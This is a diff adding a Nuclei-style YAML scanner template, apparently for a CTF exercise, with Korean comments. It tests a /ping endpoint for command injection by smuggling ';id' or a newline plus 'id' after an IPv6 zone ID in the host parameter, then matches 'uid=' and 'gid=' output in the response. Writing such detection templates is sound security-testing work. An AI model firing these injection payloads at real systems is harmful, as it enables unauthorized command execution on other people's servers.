@@ -1,0 +1,35 @@
+id: ipv6-zone-command-injection
+
+info:
+  name: IPv6 Zone ID Command Injection
+  author: jebeen
+  severity: critical
+  description: |
+    Bypasses ipaddress library validation using IPv6 Zone IDs.
+    Payload: fe80::1%;id
+  tags: ctf, rce, injection, ipv6
+
+http:
+  - method: GET
+    path:
+      # [공격] IPv6 Zone ID(%) 뒤에 세미콜론(;)을 붙여 명령어 주입
+      # URL 인코딩: % -> %25
+      - "{{BaseURL}}/ping?host=fe80::1%25;id"
+      - "{{BaseURL}}/ping?host=fe80::1%250Aid"  # 개행문자(\n) 버전
+
+    matchers-condition: or
+    matchers:
+      # [검증 1] id 명령어 실행 결과 (uid=... gid=...) 확인
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+"
+
+      # [검증 2] 혹시 에러 메시지에 명령어 실행 결과가 섞여 나올 경우 대비
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+          - "groups="
+        condition: and
